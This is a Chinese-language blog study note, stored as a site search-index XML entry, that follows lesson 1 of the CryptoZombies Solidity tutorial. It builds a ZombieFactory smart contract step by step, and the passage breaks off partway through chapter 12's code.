<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CryptoZombiesx的solidity学习</title>
      <link href="/2025/08/10/cryptozombiesx-de-solidity-xue-xi/"/>
      <url>/2025/08/10/cryptozombiesx-de-solidity-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="CryptoZombiesx的solidity学习"><a href="#CryptoZombiesx的solidity学习" class="headerlink" title="CryptoZombiesx的solidity学习"></a>CryptoZombiesx的solidity学习</h1><h2 id="Solidity-Beginner-to-Intermediate-Smart-Contracts"><a href="#Solidity-Beginner-to-Intermediate-Smart-Contracts" class="headerlink" title="Solidity: Beginner to Intermediate Smart Contracts"></a>Solidity: Beginner to Intermediate Smart Contracts</h2><h2 id="lesson1-搭建僵尸工厂"><a href="#lesson1-搭建僵尸工厂" class="headerlink" title="lesson1 搭建僵尸工厂"></a>lesson1 搭建僵尸工厂</h2><h3 id="第2章-合约"><a href="#第2章-合约" class="headerlink" title="第2章: 合约"></a>第2章: 合约</h3><p>从最基本的开始入手:</p><p>Solidity 的代码都包裹在<strong>合约</strong>里面. 一份<code>合约</code>就是以太应币应用的基本模块， 所有的变量和函数都属于一份合约, 它是你所有应用的起点.</p><p>一份名为 <code>HelloWorld</code> 的空合约如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract HelloWorld {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>版本指令</strong></p><p>所有的 Solidity 源码都必须冠以 “version pragma” — 标明 Solidity 编译器的版本. 以避免将来新的编译器可能破坏你的代码。</p><p>例如: <code>pragma solidity ^0.4.19;</code> (当前 Solidity 的最新版本是 0.4.19).</p><p>综上所述， 下面就是一个最基本的合约 — 每次建立一个新的项目时的第一段代码:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract HelloWorld {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>为了建立我们的僵尸部队， 让我们先建立一个基础合约，称为 <code>ZombieFactory</code>。</p><ol><li>在右边的输入框里输入 <code>0.4.19</code>，我们的合约基于这个版本的编译器。</li><li>建立一个空合约 <code>ZombieFactory</code>。</li></ol><p>一切完毕，点击下面 “答案” . 如果没效果，点击 “提示”。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第3章-状态变量和整数"><a href="#第3章-状态变量和整数" class="headerlink" title="第3章: 状态变量和整数"></a>第3章: 状态变量和整数</h3><p>真棒！我们已经为我们的合约做了一个外壳， 下面学习 Solidity 中如何使用变量。</p><p><strong>状态变量</strong>是被永久地保存在合约中。也就是说它们被写入以太币区块链中. 想象成写入一个数据库。</p><p>例子:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">contract Example {</span><br><span class="line">  // 这个无符号整数将会永久的被保存在区块链中</span><br><span class="line">  uint myUnsignedInteger = 100;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在上面的例子中，定义 <code>myUnsignedInteger</code> 为 <code>uint</code> 类型，并赋值100。</p><p><strong>无符号整数: <code>uint</code></strong></p><p><code>uint</code> 无符号数据类型， 指<strong>其值不能是负数</strong>，对于有符号的整数存在名为 <code>int</code> 的数据类型。</p><blockquote><p>注: Solidity中， <code>uint</code> 实际上是 <code>uint256</code>代名词， 一个256位的无符号整数。你也可以定义位数少的uints — <code>uint8</code>， <code>uint16</code>， <code>uint32</code>， 等…… 但一般来讲你愿意使用简单的 <code>uint</code>， 除非在某些特殊情况下，这我们后面会讲。</p></blockquote><p><strong>实战演习</strong></p><p>我们的僵尸DNA将由一个十六位数字组成。</p><p>定义 <code>dnaDigits</code> 为 <code>uint</code> 数据类型, 并赋值 <code>16</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第4章-数学运算"><a href="#第4章-数学运算" class="headerlink" title="第4章: 数学运算"></a>第4章: 数学运算</h3><p>在 Solidity 中，数学运算很直观明了，与其它程序设计语言相同:</p><ul><li>加法: <code>x + y</code></li><li>减法: <code>x - y</code>,</li><li>乘法: <code>x * y</code></li><li>除法: <code>x / y</code></li><li>取模 / 求余: <code>x % y</code> <em>(例如, <code>13 % 5</code> 余 <code>3</code>, 因为13除以5，余3)</em></li></ul><p>Solidity 还支持 *<strong>乘方操作*</strong> (如：x 的 y次方） // 例如： 5 ** 2 = 25</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint x = 5 ** 2; // equal to 5^2 = 25</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>为了保证我们的僵尸的DNA只含有16个字符，我们先造一个<code>uint</code>数据，让它等于10^16。这样一来以后我们可以用模运算符 <code>%</code> 把一个整数变成16位。</p><ol><li>建立一个<code>uint</code>类型的变量，名字叫<code>dnaModulus</code>, 令其等于 <strong>10 的 <code>dnaDigits</code> 次方</strong>.</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第5章-结构体"><a href="#第5章-结构体" class="headerlink" title="第5章: 结构体"></a>第5章: 结构体</h3><p>有时你需要更复杂的数据类型，Solidity 提供了 <strong>结构体</strong>:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct Person {</span><br><span class="line">  uint age;</span><br><span class="line">  string name;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>结构体允许你生成一个更复杂的数据类型，它有多个属性。</p><blockquote><p>注：我们刚刚引进了一个新类型, <code>string</code>。 字符串用于保存任意长度的 UTF-8 编码数据。 如： <code>string greeting = "Hello world!"</code>。</p></blockquote><p><strong>实战演习</strong></p><p>在我们的程序中，我们将创建一些僵尸！每个僵尸将拥有多个属性，所以这是一个展示结构体的完美例子。</p><ol><li>建立一个<code>struct</code> 命名为 <code>Zombie</code>.</li><li>我们的 <code>Zombie</code> 结构体有两个属性： <code>name</code> (类型为 <code>string</code>), 和 <code>dna</code> (类型为 <code>uint</code>)。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第6章-数组"><a href="#第6章-数组" class="headerlink" title="第6章: 数组"></a>第6章: 数组</h3><p>如果你想建立一个集合，可以用 <strong>数组</strong>这样的数据类型. Solidity 支持两种数组: <strong>静态</strong>数组和<strong>动态</strong>数组:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 固定长度为2的静态数组:</span><br><span class="line">uint[2] fixedArray;</span><br><span class="line">// 固定长度为5的string类型的静态数组:</span><br><span class="line">string[5] stringArray;</span><br><span class="line">// 动态数组，长度不固定，可以动态添加元素:</span><br><span class="line">uint[] dynamicArray;</span><br></pre></td></tr></tbody></table></figure><p>你也可以建立一个 <strong>结构体</strong>类型的数组 例如，上一章提到的 <code>Person</code>:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person[] people; // 这是动态数组，我们可以不断添加元素</span><br></pre></td></tr></tbody></table></figure><p>记住：状态变量被永久保存在区块链中。所以在你的合约中创建动态数组来保存成结构的数据是非常有意义的。</p><p><strong>公共数组</strong></p><p>你可以定义 <code>public</code> 数组, Solidity 会自动创建 <strong>getter</strong> 方法. 语法如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person[] public people;</span><br></pre></td></tr></tbody></table></figure><p>其它的合约可以从这个数组读取数据（但不能写入数据），所以这在合约中是一个有用的保存公共数据的模式。</p><p><strong>实战演习</strong></p><p>为了把一个僵尸部队保存在我们的APP里，并且能够让其它APP看到这些僵尸，我们需要一个公共数组。</p><ol><li>创建一个数据类型为 <code>Zombie</code> 的结构体数组，用 <code>public</code> 修饰，命名为：<code>zombies</code>.</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第7章-定义函数"><a href="#第7章-定义函数" class="headerlink" title="第7章: 定义函数"></a>第7章: 定义函数</h3><p>在 Solidity 中函数定义的句法如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function eatHamburgers(string _name, uint _amount) {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这是一个名为 <code>eatHamburgers</code> 的函数，它接受两个参数：一个 <code>string</code>类型的 和 一个 <code>uint</code>类型的。现在函数内部还是空的。</p><blockquote><p>注：: 习惯上函数里的变量都是以(<code>_</code>)开头 (但不是硬性规定) 以区别全局变量。我们整个教程都会沿用这个习惯。</p></blockquote><p>我们的函数定义如下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eatHamburgers("vitalik", 100);</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>在我们的应用里，我们要能创建一些僵尸，让我们写一个函数做这件事吧！</p><ol><li>建立一个函数 <code>createZombie</code>。 它有两个参数: <strong>_name</strong> (类型为<code>string</code>), 和 <strong>_dna</strong> (类型为<code>uint</code>)。</li></ol><p>暂时让函数空着——我们在后面会增加内容。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function createZombie(string _name, uint _dna) {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第8章-使用结构体和数组"><a href="#第8章-使用结构体和数组" class="headerlink" title="第8章: 使用结构体和数组"></a>第8章: 使用结构体和数组</h3><p><strong>创建新的结构体</strong></p><p>还记得上个例子中的 <code>Person</code> 结构吗？</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct Person {</span><br><span class="line">  uint age;</span><br><span class="line">  string name;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">Person[] public people;</span><br></pre></td></tr></tbody></table></figure><p>现在我们学习创建新的 <code>Person</code> 结构，然后把它加入到名为 <code>people</code> 的数组中.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 创建一个新的Person:</span><br><span class="line">Person satoshi = Person(172, "Satoshi");</span><br><span class="line"></span><br><span class="line">// 将新创建的satoshi添加进people数组:</span><br><span class="line">people.push(satoshi);</span><br></pre></td></tr></tbody></table></figure><p>你也可以两步并一步，用一行代码更简洁:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">people.push(Person(16, "Vitalik"));</span><br></pre></td></tr></tbody></table></figure><blockquote><p>注：<code>array.push()</code> 在数组的 <strong>尾部</strong> 加入新元素 ，所以元素在数组中的顺序就是我们添加的顺序， 如:</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint[] numbers;</span><br><span class="line">numbers.push(5);</span><br><span class="line">numbers.push(10);</span><br><span class="line">numbers.push(15);</span><br><span class="line">// The `numbers` array is now equal to [5, 10, 15]</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>让我们创建名为createZombie的函数来做点儿什么吧。</p><ol><li>在函数体里新创建一个 <code>Zombie</code>， 然后把它加入 <code>zombies</code> 数组中。 新创建的僵尸的 <code>name</code> 和 <code>dna</code>，来自于函数的参数。</li><li>让我们用一行代码简洁地完成它。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function createZombie(string _name, uint _dna) {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第9章-私有-公共函数"><a href="#第9章-私有-公共函数" class="headerlink" title="第9章: 私有 / 公共函数"></a>第9章: 私有 / 公共函数</h3><p>Solidity 定义的函数的属性默认为<code>公共</code>。 这就意味着任何一方 (或其它合约) 都可以调用你合约里的函数。</p><p>显然，不是什么时候都需要这样，而且这样的合约易于受到攻击。 所以将自己的函数定义为<code>私有</code>是一个好的编程习惯，只有当你需要外部世界调用它时才将它设置为<code>公共</code>。</p><p>如何定义一个私有的函数呢？</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint[] numbers;</span><br><span class="line"></span><br><span class="line">function _addToArray(uint _number) private {</span><br><span class="line">  numbers.push(_number);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这意味着只有我们合约中的其它函数才能够调用这个函数，给 <code>numbers</code> 数组添加新成员。</p><p>可以看到，在**<u>函数名字后面使用关键字 <code>private</code> 即可</u><strong>。</strong><u>和函数的参数类似，私有函数的名字用(<code>_</code>)起始。</u>**</p><p><strong>实战演习</strong></p><p>我们合约的函数 <code>createZombie</code> 的默认属性是公共的，这意味着任何一方都可以调用它去创建一个僵尸。 咱们来把它变成私有吧！</p><ol><li>变 <code>createZombie</code> 为私有函数，不要忘记遵守命名的规矩哦！</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第10章-函数的更多属性"><a href="#第10章-函数的更多属性" class="headerlink" title="第10章: 函数的更多属性"></a>第10章: 函数的更多属性</h3><p>本章中我们将学习函数的返回值和修饰符。</p><p><strong>返回值</strong></p><p>要想函数返回一个数值，按如下定义：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string greeting = "What's up dog";</span><br><span class="line"></span><br><span class="line">function sayHello() public returns (string) {</span><br><span class="line">  return greeting;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Solidity 里，函数的定义里可包含返回值的数据类型(如本例中 <code>string</code>)。</p><p><strong>函数的修饰符</strong></p><p>上面的函数实际上没有改变 Solidity 里的状态，即，它没有改变任何值或者写任何东西。</p><p>这种情况下我们可以把函数定义为 <strong>view</strong>, 意味着它只能读取数据不能更改数据:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function sayHello() public view returns (string) {</span><br></pre></td></tr></tbody></table></figure><p>Solidity 还支持 <strong>pure</strong> 函数, 表明这个函数甚至都不访问应用里的数据，例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function _multiply(uint a, uint b) private pure returns (uint) {</span><br><span class="line">  return a * b;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><u><strong>这个函数甚至都不读取应用里的状态 — 它的返回值完全取决于它的输入参数，在这种情况下我们把函数定义为 pure.</strong></u></p><blockquote><p>注：可能很难记住何时把函数标记为 pure/view。 幸运的是， Solidity 编辑器会给出提示，提醒你使用这些修饰符。</p></blockquote><p><strong>实战演习</strong></p><p>我们想建立一个帮助函数，它根据一个字符串随机生成一个DNA数据。</p><ol><li>创建一个 <code>private</code> 函数，命名为 <code>_generateRandomDna</code>。它只接收一个输入变量 <code>_str</code> (类型 <code>string</code>), 返回一个 <code>uint</code> 类型的数值。</li><li>此函数只读取我们合约中的一些变量，所以标记为<code>view</code>。</li><li>函数内部暂时留空，以后我们再添加代码。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint) {</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第11章-Keccak256-和-类型转换"><a href="#第11章-Keccak256-和-类型转换" class="headerlink" title="第11章: Keccak256 和 类型转换"></a>第11章: Keccak256 和 类型转换</h3><p>如何让 <code>_generateRandomDna</code> 函数返回一个全(半) 随机的 <code>uint</code>?</p><p>Ethereum 内部有一个散列函数<code>keccak256</code>，它用了SHA3版本。一个散列函数基本上就是把一个字符串转换为一个256位的16进制数字。字符串的一个微小变化会引起散列数据极大变化。</p><p>这在 Ethereum 中有很多应用，但是现在我们只是用它造一个伪随机数。</p><p>例子:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//6e91ec6b618bb462a4a6ee5aa2cb0e9cf30f7a052bb467b0ba58b8748c00d2e5</span><br><span class="line">keccak256("aaaab");</span><br><span class="line">//b1f078126895a1424524de5321b339ab00408010b7cf0e6ed451514981e58aa9</span><br><span class="line">keccak256("aaaac");</span><br></pre></td></tr></tbody></table></figure><p>显而易见，输入字符串只改变了一个字母，输出就已经天壤之别了。</p><blockquote><p>注: 在区块链中<strong>安全地</strong>产生一个随机数是一个很难的问题， 本例的方法不安全，但是在我们的Zombie DNA算法里不是那么重要，已经很好地满足我们的需要了。</p></blockquote><p><strong>类型转换</strong></p><p>有时你需要变换数据类型。例如:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uint8 a = 5;</span><br><span class="line">uint b = 6;</span><br><span class="line">// 将会抛出错误，因为 a * b 返回 uint, 而不是 uint8:</span><br><span class="line">uint8 c = a * b;</span><br><span class="line">// 我们需要将 b 转换为 uint8:</span><br><span class="line">uint8 c = a * uint8(b);</span><br></pre></td></tr></tbody></table></figure><p>上面, <code>a * b</code> 返回类型是 <code>uint</code>, 但是当我们尝试用 <code>uint8</code> 类型接收时, 就会造成潜在的错误。如果把它的数据类型转换为 <code>uint8</code>, 就可以了，编译器也不会出错。</p><p><strong>实战演习</strong></p><p>给 <code>_generateRandomDna</code> 函数添加代码! 它应该完成如下功能:</p><ol><li>第一行代码取 <code>_str</code> 的 <code>keccak256</code> 散列值生成一个伪随机十六进制数，类型转换为 <code>uint</code>, 最后保存在类型为 <code>uint</code> 名为 <code>rand</code> 的变量中。</li><li>我们只想让我们的DNA的长度为16位 (还记得 <code>dnaModulus</code>?)。所以第二行代码应该 <code>return</code> 上面计算的数值对 <code>dnaModulus</code> 求余数(<code>%</code>)。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory {</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaModulus = 10 ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie {</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Zombie[] public zombies;</span><br><span class="line"></span><br><span class="line">    function _createZombie(string _name, uint _dna) private {</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint) {</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaModulus;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第12章-放在一起"><a href="#第12章-放在一起" class="headerlink" title="第12章: 放在一起"></a>第12章: 放在一起</h3><p>我们就快完成我们的随机僵尸制造器了，来写一个公共的函数把所有的部件连接起来。</p><p>写一个公共函数，它有一个参数，用来接收僵尸的名字，之后用它生成僵尸的DNA。</p><p><strong>实战演习</strong></p><ol><li>创建一个 <code>public</code> 函数，命名为 <code>createRandomZombie</code>. 它将被传入一个变量 <code>_name</code> (数据类型是 <code>string</code>)。 *(注: 定义公共函数 <code>public</code> 和定义一个私有 <code>private</code> 函数的做法一样)*。</li><li>函数的第一行应该调用 <code>_generateRandomDna</code> 函数，传入 <code>_name</code> 参数, 结果保存在一个类型为 <code>uint</code> 的变量里，命名为 <code>randDna</code>。</li><li>第二行调用 <code>_createZombie</code> 函数， 传入参数： <code>_name</code> 和 <code>randDna</code>。</li><li>整个函数应该是4行代码 (包括函数的结束符号 <code>}</code> )。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory 